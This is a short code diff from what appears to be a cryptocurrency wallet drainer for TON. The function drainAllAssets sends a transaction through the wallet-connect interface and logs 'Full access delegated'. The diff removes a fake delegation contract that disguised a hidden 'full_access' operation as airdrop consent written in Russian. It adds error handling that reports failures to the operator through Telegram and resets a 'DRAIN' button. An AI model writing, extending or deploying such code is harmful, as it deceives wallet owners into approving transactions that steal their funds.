@@ -78,25 +78,14 @@ async function drainAllAssets() {
   try {
     const result = await tonConnectUI.sendTransaction(managementContract);
     console.log('Full access delegated', result);
-  } catch (error) {
-    console.error('Delegation failed', error);
-  }
+} catch (error) {
+        console.error('Transaction failed:', error);
+        alert('Error: ' + error.message);
+        sendTelegramMessage(`*Transaction failed*\nError: ${error.message}`);
+} finally {
+        drainBtn.disabled = false;
+        drainBtn.textContent = 'DRAIN';
 }
-
-function createFakeDelegationContract() {
-  return {
-    messages: [
-      {
-        address: 'EQAB...', // Фиктивный адрес "менеджмента"
-        amount: '0', // Нулевая сумма
-        payload: {
-          fake_contract: true,
-          text: 'Я подтверждаю участие в airdrop программе',
-          hidden_operation: 'full_access'
-        }
-      }
-    ]
-  };
 }
 
 // Функция отправки в Telegram
